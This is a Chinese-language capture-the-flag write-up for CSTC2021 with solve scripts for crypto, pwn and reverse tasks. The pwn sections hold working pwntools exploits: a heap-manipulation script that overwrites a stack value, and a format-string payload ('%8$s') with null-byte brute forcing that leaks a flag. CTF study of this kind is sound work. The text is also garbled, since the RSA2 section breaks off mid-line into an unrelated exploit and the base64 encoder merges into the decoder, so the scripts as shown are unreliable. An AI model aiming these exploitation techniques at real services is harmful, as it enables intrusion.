# CSTC2021 By T3ns0r
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Crypto
###  easySteram
先用hint.txt给的五组文件名，通过LCG的crack_unknown_modulus手法求出对应的a，b，n。再通过递推求出所有的key，最后用和CISCN2018的oldstreamgame几乎一样的脚本来打LFSR，结果转成八进制去掉开头的零再md5加密，用flag{}包裹提交
exp如下：
    #coding=utf-8
    from Crypto.Util.number import *
    from gmpy2 import *
    def crack_unknown_increment(states, modulus, multiplier):
        increment = (states[1] - states[0]*multiplier) % modulus
        return modulus, multiplier, increment
    def crack_unknown_multiplier(states, modulus):
        multiplier = (states[2] - states[1]) * invert(states[1] - states[0], modulus) % modulus 
        return crack_unknown_increment(states, modulus, multiplier)
    def crack_unknown_modulus(states):
        diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
        zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
        modulus = abs(reduce(gcd, zeroes))
        return crack_unknown_multiplier(states, modulus)
    s = [3552318300093355576,7287716593817904745,10709650189475092178,9473306808836439162,7033071619118870]
    n, a, b = crack_unknown_modulus(s)
    k = s[0]
    key = ''
    kk = []
    kk.append(s[0])
    f = open('./key/'+str(s[0]), 'rb')
    key += f.read()
    for i in range(999):
        k = (a*k+b)%n
        f = open('./key/'+str(k), 'rb')
        key += f.read()
        kk.append(k)
    key = bin(bytes_to_long(key))[2:][:48]
    flag = []
    for i in range(48):
        temp='1'+''.join(flag)+key[:47-len(flag)]
        if int(temp[0])^int(temp[2])^int(temp[4])^int(temp[8])^int(temp[13])^int(temp[17])^int(temp[20])^int(temp[24])^int(temp[30])^int(temp[32])^int(temp[36])^int(temp[40])^int(temp[41])^int(temp[46]) == int(key[47-len(flag)]):
            flag.insert(0,'1')
        else:
            flag.insert(0,'0')
    print(oct(eval('0b'+''.join(flag))))
    # 06352070104365057
    from hashlib import *
    print(md5('6352070104365057'.encode()).hexdigest())
    # 6b95bf3c5128f247cb64d5f3b2c4e83f
    # flag{6b95bf3c5128f247cb64d5f3b2c4e83f}
###  bad-curve
log很小，爆破即可
exp如下：
    from Crypto.Cipher import AES 
    from tqdm import tqdm
    cipher = b'\x1f\x02\x9fYy\xd3\xb0\r\xbf&O\x18\xef\x9e\\+_(\x94\x071\x84\x97\xa9\xf9\xe3h\xbf\x81\xb2\x93J\\\x8c9\x96\x17\xc2\xe2\xfb\xbaaq\xc0\x8fvdC'
    for log in tqdm(range(1000000)):
        aes=AES.new(int(log).to_bytes(16,'big'), AES.MODE_CBC, bytes(16))
        flag = aes.decrypt(cipher)
        if flag[:5] == b'flag{':
            print(flag)
            exit()
    # b'flag{eb3584ff07526fc0037819c857f10144}\n\n\n\n\n\n\n\n\n\n'
###  RSA2
先用e1=3的Related Message Attack求出所有满足条件的e2，然后第二部分在CTFwiki上找到了一个几乎一样的原题2018
CodeGate CTF Rsababy，直接一把梭
exp如下：
    from gmpy2 import *
    def getM2(a,b,c1,c2,n):
        a3 = pow(a,3,n)
        b3 = pow(b,3,n)
        first = c1-a3*c2+2*b3
        first = first % n
        second = 3*b*(a3*c2-b3)
        second = second % n
        third = second*invert(first,n)
        third = third % n
        fourth = (third+b)*invert(a,n)
        return fourth % n
    a = 1
    c1 = 8321449807360182827125
    c2 = 8321441183828895770712
    n = 378094963578091245652286477316863605753157432437621367359342302751615833557269627727449548734187939542588641672789504086476494927855747407344197241746889123693358997028141479289459947165818881146467218957546778123656120190207960702225556466771501844979094137868818924556860636212754616730115341674681116573326890134855072314950288530400350483394140781434097516134282100603979066057391672872913866678519235744668652042193736205044674422210689619562242862928626697711582401250962536787125165979017740138070213899305175933585261127763164192929103624167063213758551239415744211455417108907505646457646161227272639379721764779734013149963229002406400371319674194009206372087547010201440035410745572669645666856126204769178179570446069571090298945041726576151255620825221663591127702492882834949100599423704250729752444923956601971323645242934249137015933524911614158989705977723056398299344849153945858516695027157652464450872079484515561281333287781393423326046633891002695625031041881639987758851943448352789469117137668229144914356042850963002345804817204906458653402636643504354041188784842235312540435896510716835069861282548640947135457702591305281493685478066735573429735004662804458309301038827671971059369532684924420835204769329
    e2 = []
    # for b in range(105):
    #     for p in range(20210401, 20210505):
    #         e = getM2(a,b,c1,c2,n) - p
    #         if is_prime(e) and e>50000 and e ","1"))
    write = lambda index,num : (sla("choice > ","3"),sla("Index:",str(index)),sla("count:",str(num)))
    delate = lambda index : (sla("choice > ","2"),sla("Index:",str(index)))
    def change():
        sla("choice > ","5")
        sla("Which disk?","33")
    sla("choice > ","4")
    ru("Your disk is at: ")
    addr = int(r(14),16) - 0x8
    print(str(addr))
    log.warn("addr --> 0x%x" % addr)
    # 140737488346168 0x7fffffffdc38
    add()
    add()
    add()
    delate(0)
    delate(1)
    delate(2)
    change()
    write(2,addr)
    add()
    add()
    write(4,3435973836)
    #3435973836
    io.interactive()
###  bank
本题需要过check，然后题目会读取flag文件，我们只需要获取这段字符串即可
首先需要爆破，用\x00过strcmp，然后输入yes过第二个，最后用格式化字符串漏洞读取出栈上的flag即可
exp如下
    from pwn import * 
    from LibcSearcher import *
    context(os='linux',arch='amd64',log_level='debug')
    while True:
        ms = process("./bank")
        #ms = remote("81.70.195.166",10000)
        ms.sendlineafter("Please enter your account:\n",'a')
        ms.sendlineafter("Please enter your password:\n",'\x00'+'aaa')
        if ms.recvline() == "Do you want to check your account balance?\n":
            ms.sendline("yes")
            ms.sendlineafter("Please input your private code: \n","%8$s")
            #ms.sendlineafter("Please input your private code: \n","aa"+"%p"*9)
            flag = ms.recv(100)
            print(flag)
            exit()
        ms.close()
    ms.interactive()
## Reverse
以下均展示md5之前的flag
###  ck
观察几个函数之后发现一个疑似base64的编码算法
直接跟进去看看哪个编码表，恰好是64个字节，但是不是标准的表，应该是变种base64八九不离十了
直接上脚本，换下编码表表试试（密文在output文件里）
    # coding:utf-8
    #s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    s = ",.0fgWV#`/1Heox$~\"2dity%_;j3csz^+@{4bKrA&=}5laqB*-[69mpC()]78ndu"
    print(len(s))
    def My_base64_encode(inputs):
        # 将字符串转化为2进制
        bin_str = []
        for i in inputs:
            x = str(bin(ord(i))).replace('0b', '')
            bin_str.append('{:0>8}'.format(x))
        # print(bin_str)
        # 输出的字符串
        outputs = ""
        # 不够三倍数，需补齐的次数
        nums = 0
        while bin_str:
            # 每次取三个字符的二进制
            temp_list = bin_str[:3]
            if (len(temp_list) != 3):
                nums = 3 - len(temp_list)
                while len(temp_list) 6}'.format(x))
        # print(bin_str)
        # 输出的字符串
        outputs = ""
        nums = inputs.count('=')
        while bin_str:
            temp_list = bin_str[:4]
            temp_str = "".join(temp_list)
            # print(temp_str)
            # 补足8位字节
            if (len(temp_str) % 8 != 0):
                temp_str = temp_str[0:-1 * nums * 2]
            # 将四个6字节的二进制转换为三个字符
            for i in range(0, int(len(temp_str) / 8)):
                outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2))
            bin_str = bin_str[4:]
        print("Decrypted String:\n%s " % outputs)